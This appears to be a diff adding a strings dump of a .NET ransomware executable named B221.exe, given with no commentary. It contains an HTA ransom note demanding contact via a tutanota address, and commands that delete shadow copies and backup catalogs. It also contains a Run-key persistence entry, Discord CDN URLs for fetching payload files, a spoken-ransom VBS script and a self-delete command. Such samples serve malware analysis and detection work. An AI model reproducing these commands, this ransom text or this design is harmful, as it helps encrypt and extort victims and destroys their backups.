@@ -1,0 +1,406 @@
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+v4.0.30319
+#Strings
+<>c__DisplayClass20_0
+<rndchz>b__0
+IEnumerable`1
+Microsoft.Win32
+Func`2
+SHA256
+get_UTF8
+<Module>
+System.IO
+get_IV
+set_IV
+DownloadData
+.info.hta
+mscorlib
+System.Collections.Generic
+DownloadFileAsync
+Thread
+add_Load
+RijndaelManaged
+get_Checked
+Synchronized
+Append
+set_Mode
+set_AutoScaleMode
+FileMode
+PaddingMode
+CryptoStreamMode
+CipherMode
+Enumerable
+IDisposable
+Double
+RuntimeFieldHandle
+RuntimeTypeHandle
+GetTypeFromHandle
+get_MainModule
+ProcessModule
+set_WindowStyle
+ProcessWindowStyle
+set_Name
+get_FileName
+set_FileName
+WriteLine
+System.Core
+ButtonBase
+ApplicationSettingsBase
+Dispose
+Create
+EditorBrowsableState
+STAThreadAttribute
+CompilerGeneratedAttribute
+GuidAttribute
+GeneratedCodeAttribute
+DebuggerNonUserCodeAttribute
+DebuggableAttribute
+EditorBrowsableAttribute
+ComVisibleAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+TargetFrameworkAttribute
+AssemblyFileVersionAttribute
+AssemblyConfigurationAttribute
+AssemblyDescriptionAttribute
+OrangeHeapAttribute
+CompilationRelaxationsAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+SetValue
+B221.exe
+set_Size
+get_BlockSize
+set_BlockSize
+set_AutoSize
+set_ClientSize
+get_KeySize
+set_KeySize
+System.Threading
+set_Padding
+Encoding
+System.Runtime.Versioning
+FromBase64String
+ToString
+System.Drawing
+ComputeHash
+get_ExecutablePath
+get_StartupPath
+GetFolderPath
+get_Length
+GetLength
+System.ComponentModel
+user32.dll
+ContainerControl
+FileStream
+CryptoStream
+MemoryStream
+System
+SymmetricAlgorithm
+HashAlgorithm
+Random
+ICryptoTransform
+set_ShowIcon
+GetExtension
+Application
+set_Location
+System.Configuration
+System.Globalization
+System.Reflection
+ControlCollection
+Exception
+StringComparison
+Intern
+CultureInfo
+SystemParametersInfo
+set_StartInfo
+ProcessStartInfo
+System.Linq
+set_ShowInTaskbar
+AesCryptoServiceProvider
+StringBuilder
+SpecialFolder
+ResourceManager
+EventHandler
+System.CodeDom.Compiler
+IContainer
+CurrentUser
+StreamWriter
+TextWriter
+set_UseVisualStyleBackColor
+.cctor
+CreateEncryptor
+IntPtr
+System.Diagnostics
+System.Runtime.InteropServices
+System.Runtime.CompilerServices
+System.Resources
+.resources
+.resources
+DebuggingModes
+GetDirectories
+GetFiles
+EnableVisualStyles
+Rfc2898DeriveBytes
+ReadAllBytes
+WriteAllBytes
+GetBytes
+EventArgs
+Equals
+get_Controls
+System.Windows.Forms
+Contains
+set_AutoScaleDimensions
+get_Chars
+RuntimeHelpers
+GetCurrentProcess
+set_Arguments
+Exists
+Concat
+Repeat
+Object
+Select
+System.Net
+set_MinWorkingSet
+op_Explicit
+SetCompatibleTextRenderingDefault
+WebClient
+Environment
+Convert
+SuspendLayout
+ResumeLayout
+PerformLayout
+System.Text
+get_Text
+set_Text
+set_CreateNoWindow
+set_TabIndex
+set_MinimizeBox
+set_MaximizeBox
+CheckBox
+TextBox
+InitializeArray
+ToArray
+get_Key
+set_Key
+OpenSubKey
+RegistryKey
+System.Security.Cryptography
+get_Assembly
+Directory
+Registry
+set_Opacity
+`b l!j"h#j$l%R&P'R(L)J*H+J,L-B.@/B0L1J2H3 4"5<6:788:9<:2;0<8=->'?8@"A<B$C.D
+kc x!]"o#{${%n&i'k(X)Q*w+o,
+$k e!d"'#)$t%q&j'g(u)
+T^ X!Q"]#F$B%&
+6*7+829$:+;*<-=.>"?/@#A%B$C"D'E!F6G<H4I<J=K%LXMMNaO3P3Q*RaSoTqU
+ZP Z!S"[#@$@%
+809&:-;,<(=">(?-@.A$B C'D*E#F!G#H=I=J>K#LYMONHOLPXQKR@S*TkUvV`W
+02 4!:"8#
+x| j!]"t#
+%o&d'G(e)l*`+g,w- .(/
+Dh e!b"*#%$P%q&w'd(
+f  (!
+)@*0+*,5-9.)/z00152'394'5 627<8%9p:);'<!=)>8?j@>A-B5C#DeE!F-G!H3I9JOKJLXMXN
+O[PWQ\R
+SaT\UZVWW]XFYCZ
+[M\L]B^
+_D`Fa\b
+cTd@eWfWgMhSiEj?kjlumynvo:pnqqrcs~tzuavgw2xby`zj{m|d}m~g
+#U$J%K&M'
+(@)S*?+n,r-o.h/s0{1t2r364a5{637`8t9s:`;x<h=~>+?~@aAmB'C`DlEhFfGqH#I
+ao "!#"
+WrapNonExceptionThrows
+Copyright 
+  2021
+$18f9f915-9529-466b-b2f5-e2d2d13f733e
+1.0.0.0
+.NETFramework,Version=v4.7.2
+FrameworkDisplayName
+.NET Framework 4.7.2@
+3System.Resources.Tools.StronglyTypedResourceBuilder
+4.0.0.0
+KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator
+11.0.0.0
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01//EN' 'http://www.w3.org/TR/html4/strict.dtd'>
+<html>
+  <head>
+    <meta charset='windows-1251'>
+    <title>encrypted</title>
+    <HTA:APPLICATION
+      ICON='msiexec.exe'
+      SINGLEINSTANCE='yes'
+      SysMenu="no">
+    <script language='JScript'>
+      window.moveTo(50, 50);
+      window.resizeTo(screen.width - 100, screen.height - 100);
+    </script>
+    <style type='text/css'>
+      body {
+        font: 15px Tahoma, sans-serif;
+        margin: 10px;
+        line-height: 25px;
+        background: #80d594;
+      }
+      .bold {
+        font-weight: bold;
+      }
+      .mark {
+        background: #338a43;
+        padding: 2px 5px;
+      }
+  img {
+display:block;
+margin:auto;
+      .header {
+text-align: center;
+        font-size: 30px;
+        line-height: 50px;
+        font-weight: bold;
+margin-bottom:20px;
+      }
+      .info {
+        background: #D0D0E8;
+        border-left: 10px solid #00008B;
+      }
+      .alert {
+        background: #fea702;
+        border-left: 10px solid  #ff4308;
+      }
+      .private {
+        border: 1px dashed #000;
+        background: #FFFFEF;
+      }
+.separator {
+  background: #D0D0E8;
+        border-left: 10px solid #D0D0E8;
+      .note {
+        height: auto;
+        padding-bottom: 1px;
+        margin: 15px 0;
+      }
+      .note .title {
+        font-weight: bold;
+        text-indent: 10px;
+        height: 30px;
+        line-height: 30px;
+        padding-top: 10px;
+      }
+      .note .mark {
+        background: #A2A2B5;
+      }
+      .note ul {
+        margin-top: 0;
+      }
+      .note pre {
+        margin-left: 15px;
+        line-height: 13px;
+        font-size: 13px;
+      }
+    </style>
+  </head>
+  <body>
+    <img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAQAAAAAYLlVAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAAAAmJLR0QA/4ePzL8AAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfjAwwMJwSFwIn8AAADNklEQVRo3u2ZTUhUURTHfzozmprmZ1pYEmkfJNEmiwwkSEyFECIQpEUboYhqFYHQXlcti9rUKldWBEUiuQpbtDDNzD5G8qM0HRXLRtO5LdJx3puPd++8+xyIztm88zgf/3veufeee18SdimDI1RxnL0U4gbAzxhDdPGCfpZs+49JWTTyFB8iAq8wTju1pDgXvopOliIGX+d57rHPieBuLvLNIvgaD1KvP/x1FiTDCwQTNOkFcJVfCuEFgq+c0he+minF8AJBH2WRnCUph8/nIZVhb2d5w1smEbjYSTn7SQ/TucsFlnWkPxBW6Xc4RkbIoHKooSNshsxRbT98Eb0mtyM04oqgmR6hUNvtrwrnWDa4nOVMVF0XLfw2aPuosBfezQPTmNpiVtFmnpj0W+wBKMFrcPeJ3RYWNfwwWHSSZgdAHX6Du5uWFpl0myqm1KiQrASgnNQQaZFOS4t5nhvkAnbZAbDHIE0wIGHzmsUQKdXkQwlACtsN8ijfJay8zBjkovgBbCLPlAG/hNUcswa5IH4Ayasdzxr5pBbWRRYMstGHYg04QAkH4FbQFSwTCKbdI7mzWVipbMceKtiCCFqO0OeY1caRbAaKOcgOCpQ+WWTyM8EwvfjkTfJoYZDFONqwaPyTHs7LbktlPNMYep2XuE22dfhsHjkS/i+3Wn/SK2EdoE72UeuyGH8rxbbLLjqlkRlb4TAzDo5fIJiOvRTnR+ju9VJuwveC/wASDsD+2h5KUyyQTVZiALzjFt3MsY16mtmqx2mt9BbUw4EQuzpG
+    <div class='header'>
+<div>ALL YOUR FILES ARE ENCRYPTED* BUT NOT DELETED</div>
+  </div>
+  <div class='bold'>Your computer is infected with a virus.</div>
+ <div class='bold'>Files are encrypted* but not deleted.</div>
+   <div class='bold'>Send an email <span class="mark">neftet@tutanota.com</span>, specify in the subject unique identifier <span class="mark">7AF6F6E7-5499</span> and you will definitly be helped to recover.</div>
+   <div class="bold">*you can send us a couple of files and we will return the restored ones to prove that only we can do it</div> 
+    <div class='note alert'>
+      <div class='title'>IMPORTANT:</div>
+      <ul>
+        <a>1. the infection was due to vulnerabilities in your software.<br></a>
+        <a>2. if you want to make sure that it is impossible to recover files using third-party software, do this not on all files, otherwise you may lose all data.<br></a>
+        <a>3. only communication through our email can guarantee file recover for you. We are not responsible for the actions of third parties who promise to help you - most often they are scammers.<br></a>
+        
+        <a>4. please, do not try to rename encrypted files.<br></a>
+        <a>5. our goal is to return your data, but if you don't contact us, we will not succeed.<br></a>
+      </ul>
+    </div>
+  </body>
+</html>
+_CorExeMain
+mscoree.dll
+|s|s2e|U|
+k|y|7|Z|P
+|s|{={{T|
+|{|] j|z{B|{|O
+|{|]+k{w{E{|S|
+I{V|0|t{qA{{|N
+|{|^6m|x|<d|S|
+J{{{:{{|r5|X|N
+K{V|Dl{x|,d|S|
+|{|_H|{|o'|X|M
+J{{{B{{u|!c|R|
+|Q|`>|u|n
+R|`|.v|n|
+|p|t|<C
+f|x|=B
+b|g|T|
+b4<|GC
+b;|[|?
+b|T|h|
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/
+.[neftet@tutanota.com].clock
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+rundll.exe
+.index
+cmd.exe
+/C vssadmin.exe delete shadows /all /quiet
+/C wmic shadowcopy delete
+/C wbadmin delete catalog -quiet
+https://cdn.discordapp.com/attachments/599226424695455755/800465961706192906/QEf56.bmp
+\QEf56.bmp
+https://cdn.discordapp.com/attachments/599226424695455755/800381592539103233/READ_ME.hta
+\READ_ME.hta
+ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
+Set f=CreateObject("Scripting.FileSystemObject")
+f.DeleteFile Wscript.ScriptFullName, True
+On Error Resume Next
+Set v=CreateObject("sapi.spvoice")
+v.Speak "Attention! Attention!"
+WScript.Sleep(1500)
+v.Speak "All you documents, data bases and other important files were encrypted and Windows can not restore them without special software"
+v.Speak "User action is required as soon as possible to recover the files"
+WScript.Sleep(2000)
+WScript.Sleep(120000)
+/C choice /C Y /N /D Y /T 1 & Del "
+chkUpdateRegistry
+984654654654
+d654654
+notepad.exe
+B221.Properties.Resources
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+CompanyName
+FileDescription
+FileVersion
+1.0.0.0
+InternalName
+B221.exe
+LegalCopyright
+Copyright 
+  2021
+LegalTrademarks
+OriginalFilename
+B221.exe
+ProductName
+ProductVersion
+1.0.0.0
+Assembly Version
+1.0.0.0
